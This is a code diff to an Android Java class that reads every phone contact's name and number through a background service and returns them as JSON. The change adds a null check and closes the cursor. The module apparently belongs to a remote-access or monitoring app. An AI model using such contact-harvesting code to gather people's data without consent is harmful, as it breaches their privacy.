@@ -16,28 +16,30 @@ import org.json.JSONObject;
 public class ContactsManager {
 
     public static JSONObject getContacts(){
-
+        Cursor cur = null;
         try {
             JSONObject contacts = new JSONObject();
             JSONArray list = new JSONArray();
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
 
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    JSONObject contact = new JSONObject();
+                    String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-            while (cur.moveToNext()) {
-                JSONObject contact = new JSONObject();
-                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
-                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
-
-                contact.put("phoneNo", num);
-                contact.put("name", name);
-                list.put(contact);
-
+                    contact.put("phoneNo", num);
+                    contact.put("name", name);
+                    list.put(contact);
+                }
             }
             contacts.put("contactsList", list);
             return contacts;
         } catch (JSONException e) {
             e.printStackTrace();
+        } finally {
+            if (cur != null) cur.close();
         }
         return null;
 
